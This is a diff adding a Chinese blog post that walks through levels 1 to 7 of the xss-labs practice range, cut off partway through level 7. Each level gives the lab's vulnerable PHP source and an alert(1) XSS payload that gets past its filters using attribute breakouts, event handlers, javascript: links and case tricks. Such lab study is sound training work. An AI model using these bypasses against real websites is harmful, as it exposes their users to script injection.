@@ -168,6 +168,323 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-xss-labs" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/04/22/xss-labs/" class="article-date">
+  	<time datetime="2020-04-22T12:48:52.281Z" itemprop="datePublished">2020-04-22</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/04/22/xss-labs/">
+        xss-labs
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="xss-labs第一关"><a href="#xss-labs第一关" class="headerlink" title="xss-labs第一关"></a>xss-labs第一关</h4><p>源码</p>
+<p>分析</p>
+<p>分析：</p>
+<ul>
+<li>后台源码将用户以GET方式提交的参数name，原封不动地显示在HTML页面中，所以将弹框语句放入name变量中即可：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;content-type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert &#x3D; function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href&#x3D;&quot;level2.php?keyword&#x3D;test&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level1&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align&#x3D;center&gt;欢迎来到level1&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; $_GET[&quot;name&quot;];</span><br><span class="line">echo &quot;&lt;h2 align&#x3D;center&gt;欢迎用户&quot;.$str.&quot;&lt;&#x2F;h2&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src&#x3D;level1.png&gt;&lt;&#x2F;center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;&#x2F;h3&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>构造一个内容，这里输入111，F12查看</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417113056134.png" alt="image-20200417113056134"></p>
+<p>这里没有进行任何过滤和防护，而且是直接在h2标签中，这样直接使用使用script标签构造XSS</p>
+<p>payload：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417113334965.png" alt="image-20200417113334965"></p>
+<h4 id="xss-labs第二关"><a href="#xss-labs第二关" class="headerlink" title="xss-labs第二关"></a>xss-labs第二关</h4><p>源码</p>
+<p>分析：</p>
+<p><code>htmlspecialchars</code>：</p>
+<ul>
+<li>作用：把预定义的字符转换为 HTML 实体，而不是作为标签运行；如果不用HTMLSpecialChars，就会导致读取时，把” <script>"之类的HTML标签带有功能地输出。</li>
+<li>HTML实体格式：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&amp;entity_name;</span><br><span class="line">或者</span><br><span class="line">&amp;#entity_number;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>转化规则：</li>
+</ul>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417154345824.png" alt="image-20200417154345824"></p>
+<ul>
+<li>如下例，在使用了htmlspecialchars后，将输出字符串""；当不使用时，则会弹框。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str&#x3D;&quot;&lt;script&gt;alert(&#39;123&#39;)&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">echo htmlspecialchars($str); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>本例中，在返回的HTML页面的第一处使用了htmlspecialchars，而第二处没有使用，且两处都没有过滤机制。所以我们在第二处闭合<code>&lt;input&gt;</code>标签，直接弹框：</p>
+<p>payload：<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;content-type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert &#x3D; function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href&#x3D;&quot;level3.php?writing&#x3D;wait&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level2&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align&#x3D;center&gt;欢迎来到level2&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; $_GET[&quot;keyword&quot;];</span><br><span class="line">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;</span><br><span class="line">&lt;form action&#x3D;level2.php method&#x3D;GET&gt;</span><br><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.$str.&#39;&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;&quot;搜索&quot;&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src&#x3D;level2.png&gt;&lt;&#x2F;center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;&#x2F;h3&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>构造内容，F12查看，如果找不到ctrl+F进行搜索。</p>
+<p>这里在input标签中，进行了双引号包裹。所以需要进行闭合标签</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417113440241.png" alt="image-20200417113440241"></p>
+<p>闭合标签因为是双引号闭合格式"></p>
+<p>复制payload提交</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417113634778.png" alt="image-20200417113634778"></p>
+<h4 id="xss-labs第三关"><a href="#xss-labs第三关" class="headerlink" title="xss-labs第三关"></a>xss-labs第三关</h4><p>源码</p>
+<p>分析</p>
+<p>一共有两处转义：</p>
+<ul>
+<li>第一处转义，输入被转义为html实体，不能直接执行；</li>
+<li>第二处转义，输入被转义为html实体，不能直接执行，也不能闭合双引号。但是单引号没被转义。</li>
+<li>所以可以用单引号闭合input标签，使用不包含被转义特殊字符的弹框方式。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;content-type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert &#x3D; function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href&#x3D;&quot;level4.php?keyword&#x3D;try harder!&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level3&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align&#x3D;center&gt;欢迎来到level3&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; $_GET[&quot;keyword&quot;];</span><br><span class="line">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&quot;&lt;center&gt;</span><br><span class="line">&lt;form action&#x3D;level3.php method&#x3D;GET&gt;</span><br><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&#39;&quot;.htmlspecialchars($str).&quot;&#39;&gt;	</span><br><span class="line">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;center&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src&#x3D;level3.png&gt;&lt;&#x2F;center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;&#x2F;h3&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>构造内容查看响应</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417114943215.png" alt="image-20200417114943215"></p>
+<p>发现和第二关一样，闭合提交</p>
+<p>发现，尖括号被转义了</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417115114909.png" alt="image-20200417115114909"></p>
+<p>所以就不能使用尖括号进行xss了，这里可以使用事件或者伪协议等</p>
+<p>事件payload：<code>&#39;onclick=&#39;alert(1)</code></p>
+<p>因为这里使用的是onclick所以提交之后需要单击一下输入框才能弹出弹框</p>
+<p>如果不想单击使用onmouseover进行提交，提交之后鼠标放到输入框就会弹出</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417115310530.png" alt="image-20200417115310530"></p>
+<p>伪协议payload：'onclick='javascript:alert(1)</p>
+<p>进行提交，弹出弹框。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417115702177.png" alt="image-20200417115702177"></p>
+<h4 id="xss-labs第四关"><a href="#xss-labs第四关" class="headerlink" title="xss-labs第四关"></a>xss-labs第四关</h4><p>源码</p>
+<p>分析</p>
+<ul>
+<li>将用户输入个keyword中的<和>替换为空，但在input标签内并未转义。所以直接闭合input标签中的value（不能闭合整个input标签）并使用不带尖括号但弹框方式即可。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;content-type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert &#x3D; function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href&#x3D;&quot;level5.php?keyword&#x3D;find a way out!&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level4&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align&#x3D;center&gt;欢迎来到level4&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; $_GET[&quot;keyword&quot;];</span><br><span class="line">$str2&#x3D;str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);</span><br><span class="line">$str3&#x3D;str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);</span><br><span class="line">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;</span><br><span class="line">&lt;form action&#x3D;level4.php method&#x3D;GET&gt;</span><br><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.$str3.&#39;&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src&#x3D;level4.png&gt;&lt;&#x2F;center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;.strlen($str3).&quot;&lt;&#x2F;h3&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>构造内容，响应中查找</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417115758872.png" alt="image-20200417115758872"></p>
+<p>进行闭合，尝试，尖括号过滤了</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417115832532.png" alt="image-20200417115832532"></p>
+<p>使用事件来进行xss尝试</p>
+<p>使用单引号闭合的时候发现颜色不一样</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417120155860.png" alt="image-20200417120155860"></p>
+<p>在使用双引号</p>
+<p>payload：<code>&quot;onclick=&quot;alert(1)</code></p>
+<p>成功闭合，伪协议用法相同</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417120248869.png" alt="image-20200417120248869"></p>
+<h4 id="xss-labs第五关"><a href="#xss-labs第五关" class="headerlink" title="xss-labs第五关"></a>xss-labs第五关</h4><p>源码</p>
+<p>分析</p>
+<ul>
+<li>对<script和on关键字进行了过滤</li>
+<li>第二次引用keyword时没有转义，可以闭合input标签；然后采用不含<script和on的弹框方式</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;content-type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert &#x3D; function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href&#x3D;&quot;level6.php?keyword&#x3D;break it out!&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level5&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align&#x3D;center&gt;欢迎来到level5&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2&#x3D;str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</span><br><span class="line">$str3&#x3D;str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;</span><br><span class="line">&lt;form action&#x3D;level5.php method&#x3D;GET&gt;</span><br><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.$str3.&#39;&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src&#x3D;level5.png&gt;&lt;&#x2F;center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;.strlen($str3).&quot;&lt;&#x2F;h3&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>构造内容，提交</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417122148322.png" alt="image-20200417122148322"></p>
+<p>进行闭合尝试，发现对script进行了过滤</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417122411832.png" alt="image-20200417122411832"></p>
+<p>尝试构造事件，发现onclick进行了过滤，在中间加了下划线</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417122546166.png" alt="image-20200417122546166"></p>
+<p>利用没有过滤尖括号，构造a标签再尝试利用a标签的href属性执行javascript:伪协议，没有对javascript进行过滤，触发xss</p>
+<p>payload：<code>&quot;&gt;&lt;a href=&#39;javascript:alert(1)&#39;&gt;</code></p>
+<p>复制payload提交，点击超链接</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417123342981.png" alt="image-20200417123342981"></p>
+<p>如果感觉这个尖括号不好找的话可以更改</p>
+<p>payload：<code>&quot;&gt;&lt;a href=&#39;javascript:alert(1)&#39;&gt;提交&lt;</code></p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417123459136.png" alt="image-20200417123459136"></p>
+<p>点击超链接，成功弹框</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417123511122.png" alt="image-20200417123511122"></p>
+<h4 id="xss-labs第六关"><a href="#xss-labs第六关" class="headerlink" title="xss-labs第六关"></a>xss-labs第六关</h4><p>源码</p>
+<p>分析</p>
+<ul>
+<li>过滤了<script、on、src、data、href标签</li>
+<li>但是替换之前没有转化为小写字母，所以可以用大小写绕过</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;content-type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert &#x3D; function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href&#x3D;&quot;level7.php?keyword&#x3D;move up!&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level6&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align&#x3D;center&gt;欢迎来到level6&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; $_GET[&quot;keyword&quot;];</span><br><span class="line">$str2&#x3D;str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</span><br><span class="line">$str3&#x3D;str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4&#x3D;str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5&#x3D;str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6&#x3D;str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;</span><br><span class="line">&lt;form action&#x3D;level6.php method&#x3D;GET&gt;</span><br><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.$str6.&#39;&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src&#x3D;level6.png&gt;&lt;&#x2F;center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;.strlen($str6).&quot;&lt;&#x2F;h3&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>闭合进行查看，script进行了过滤</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417130324942.png" alt="image-20200417130324942"></p>
+<p>使用事件进行构造，事件也被过滤了</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417130416339.png" alt="image-20200417130416339"></p>
+<p>发现和第五关一样，继续使用a标签进行闭合</p>
+<p>href被过滤了</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417130529935.png" alt="image-20200417130529935"></p>
+<p>因为href被过滤了，进行大小写尝试，提交之后发现遍蓝了，点击超链接</p>
+<p>payload：<code>&quot;&gt;&lt;a Href=&#39;javascript:alert(1)&#39;&gt;提交&lt;</code></p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417130621363.png" alt="image-20200417130621363"></p>
+<p>页面成功弹框</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417130702200.png" alt="image-20200417130702200"></p>
+<h4 id="xss-labs第七关"><a href="#xss-labs第七关" class="headerlink" title="xss-labs第七关"></a>xss-labs第七关</h4><p>源码</p>
+<p>分析</p>
+<ul>
+<li>过滤了script、on、src、data、href，并且在过滤前将keyword转换为了小写</li>
+<li>第二处引用keyword没有编码，可以闭合input标签后，重写关键字绕过过滤</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;content-type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert &#x3D; function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href&#x3D;&quot;level8.php?keyword&#x3D;nice try!&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level7&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align&#x3D;center&gt;欢迎来到level7&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D;strtolower( $_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2&#x3D;str_replace(&quot;script&quot;,&quot;&quot;,$str);</span><br><span class="line">$str3&#x3D;str_replace(&quot;on&quot;,&quot;&quot;,$str2);</span><br><span 